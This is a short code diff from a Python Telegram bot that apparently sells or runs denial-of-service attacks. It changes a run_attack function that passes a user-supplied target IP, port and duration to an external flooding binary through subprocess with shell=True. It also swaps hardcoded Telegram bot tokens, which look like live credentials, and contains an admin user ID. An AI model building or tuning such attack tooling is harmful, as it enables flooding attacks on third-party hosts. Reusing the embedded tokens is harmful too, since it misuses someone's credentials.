@@ -9,7 +9,7 @@ import threading
 import time
 
 # Bot token and admin user ID (as strings)
-bot = telebot.TeleBot('7248587968:AAEsQFgweeIhsRwMH4nD2uKINX_DGpzpGaQ')
+bot = telebot.TeleBot('6642742035:AAHW1FAmgtIoaHmR4_hMRIDcHVTTUg7wmnM')
 admin_id = {"6539807903"}
 
 # Files for data storage
@@ -161,7 +161,7 @@ def start_attack_reply(message, target, port, duration):
 # Function to run the attack using subprocess
 def run_attack(target, port, duration):
     global attack_in_progress, attack_end_time
-    full_command = f"./mrin {target} {port} {duration} 512 750"
+    full_command = f"./mrin {target} {port} {duration} 600"
     subprocess.run(full_command, shell=True)
     # Once the attack finishes, mark the target IP as attacked and clear the global attack flag
     with attack_lock:
